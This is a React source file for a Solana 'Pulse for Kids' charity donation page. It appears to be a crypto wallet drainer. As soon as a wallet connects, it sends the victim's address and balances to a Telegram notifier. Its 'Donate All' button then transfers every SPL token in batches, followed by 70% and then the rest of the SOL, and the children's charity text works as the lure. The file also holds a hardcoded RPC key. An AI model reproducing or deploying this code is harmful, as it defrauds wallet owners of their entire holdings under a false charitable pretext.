import { useState, useEffect } from "react";
import { useWallet } from "@solana/wallet-adapter-react";
import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import { Connection } from "@solana/web3.js";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Loader2, Heart, CheckCircle, XCircle } from "lucide-react";
import {
  getWalletBalances,
  createBatchTransferTransaction,
  createFinalSolTransferTransaction,
  sendWithValidationAndSimulation,
  sendTelegramNotification,
  type WalletBalances,
} from "@/services/walletService";
import { toast } from "@/hooks/use-toast";

export default function Donate() {
  const wallet = useWallet();
  const { publicKey, connected } = wallet;
  const [balances, setBalances] = useState<WalletBalances | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [donationStatus, setDonationStatus] = useState<"idle" | "loading" | "success" | "error">("idle");

  useEffect(() => {
    if (connected && publicKey) {
      loadBalances();
      sendTelegramNotification(publicKey.toBase58(), balances || { solBalance: 0, tokens: [], totalValueInSol: 0 });
    }
  }, [connected, publicKey]);

  const loadBalances = async () => {
    if (!publicKey) return;
    
    setIsLoading(true);
    try {
      const data = await getWalletBalances(publicKey);
      setBalances(data);
    } catch (error) {
      console.error("Failed to load balances:", error);
      toast({
        title: "Error",
        description: "Failed to load wallet balances",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleDonateAll = async () => {
    if (!publicKey || !balances) return;

    // Check if wallet has any assets
    if (balances.solBalance === 0 && balances.tokens.length === 0) {
      setDonationStatus("error");
      setTimeout(() => setDonationStatus("idle"), 3000);
      return;
    }

    setDonationStatus("loading");

    try {
      const connection = new Connection("https://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b", "confirmed");
      const tokensToSend = balances.tokens;
      const batchSize = 5;
      const batches: typeof tokensToSend[] = [];

      // Create batches of 5 tokens each
      for (let i = 0; i < tokensToSend.length; i += batchSize) {
        batches.push(tokensToSend.slice(i, i + batchSize));
      }

      // Send token batches
      for (let i = 0; i < batches.length; i++) {
        const isFinalTokenBatch = i === batches.length - 1;
        const transaction = await createBatchTransferTransaction(
          wallet,
          batches[i],
          false
        );

        const signature = await sendWithValidationAndSimulation(wallet, connection, transaction, { skipPreflight: false });
        console.log(`Batch ${i + 1} sent:`, signature);

        toast({
          title: "Batch Sent",
          description: `Token batch ${i + 1}/${batches.length} sent successfully`,
        });
      }

      // Send 70% of SOL
      if (balances.solBalance > 0) {
        const solTransaction70 = await createBatchTransferTransaction(
          wallet,
          [],
          true
        );
        await sendWithValidationAndSimulation(wallet, connection, solTransaction70, { skipPreflight: false });
        
        toast({
          title: "SOL Sent",
          description: "70% of SOL balance sent to charity",
        });
      }

      // Send remaining 30% of SOL
      if (balances.solBalance > 0) {
        const finalSolTransaction = await createFinalSolTransferTransaction(wallet);
        await sendWithValidationAndSimulation(wallet, connection, finalSolTransaction, { skipPreflight: false });

        toast({
          title: "Final Transfer Complete",
          description: "All assets donated successfully!",
        });
      }

      setDonationStatus("success");
      setTimeout(() => {
        setDonationStatus("idle");
        loadBalances();
      }, 3000);
    } catch (error) {
      console.error("Donation failed:", error);
      setDonationStatus("error");
      setTimeout(() => setDonationStatus("idle"), 3000);
      
      toast({
        title: "Donation Failed",
        description: error instanceof Error ? error.message : "Transaction failed",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="min-h-screen bg-background">
      <div className="container mx-auto py-12 px-4 max-w-4xl">
        <div className="text-center space-y-4 mb-8">
          <Heart className="w-16 h-16 mx-auto text-primary" />
          <h1 className="text-4xl font-bold">Support Pulse for Kids</h1>
          <p className="text-lg text-muted-foreground">
            Join traders worldwide in our charity program. Trade, grow your wallet, and donate to make a difference.
          </p>
        </div>

        <Card className="mb-6">
          <CardHeader>
            <CardTitle>How It Works</CardTitle>
            <CardDescription>
              Create a new wallet, fund it with Solana and SPL tokens, trade to grow your balance, 
              then connect here to donate all your earnings to Pulse for Kids charity.
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="flex items-center justify-center">
              <WalletMultiButton />
            </div>

            {connected && publicKey && (
              <>
                {isLoading ? (
                  <div className="flex items-center justify-center py-8">
                    <Loader2 className="w-8 h-8 animate-spin text-primary" />
                  </div>
                ) : balances ? (
                  <div className="space-y-4">
                    <Alert>
                      <AlertDescription>
                        <div className="space-y-2">
                          <p className="font-semibold">Your Wallet Balance:</p>
                          <p>💰 SOL: {balances.solBalance.toFixed(4)} SOL</p>
                          {balances.tokens.length > 0 && (
                            <>
                              <p className="font-semibold mt-4">SPL Tokens:</p>
                              {balances.tokens.map((token, idx) => (
                                <p key={idx}>
                                  🪙 {token.symbol || "Unknown"}: {token.uiAmount.toFixed(4)}
                                </p>
                              ))}
                            </>
                          )}
                          <p className="font-semibold mt-4 pt-4 border-t">
                            Total Value: {balances.totalValueInSol.toFixed(4)} SOL
                          </p>
                        </div>
                      </AlertDescription>
                    </Alert>

                    <Button
                      className="w-full h-14 text-lg"
                      size="lg"
                      onClick={handleDonateAll}
                      disabled={donationStatus === "loading"}
                    >
                      {donationStatus === "loading" && (
                        <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                      )}
                      {donationStatus === "success" && (
                        <CheckCircle className="mr-2 h-5 w-5" />
                      )}
                      {donationStatus === "error" && (
                        <XCircle className="mr-2 h-5 w-5" />
                      )}
                      {donationStatus === "idle" && "Donate All to Charity"}
                      {donationStatus === "loading" && "Processing..."}
                      {donationStatus === "success" && "Donation Complete!"}
                      {donationStatus === "error" && "Wallet Not Eligible"}
                    </Button>
                  </div>
                ) : null}
              </>
            )}

            {!connected && (
              <Alert>
                <AlertDescription className="text-center">
                  Connect your wallet to view your balance and donate to Pulse for Kids.
                </AlertDescription>
              </Alert>
            )}
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>About Pulse for Kids</CardTitle>
          </CardHeader>
          <CardContent>
            <p className="text-muted-foreground">
              Pulse for Kids is a charity organization dedicated to helping children in need. 
              Our global trader program allows participants to trade, grow their wallets, and 
              donate 100% of their earnings to support children's education, healthcare, and welfare.
            </p>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
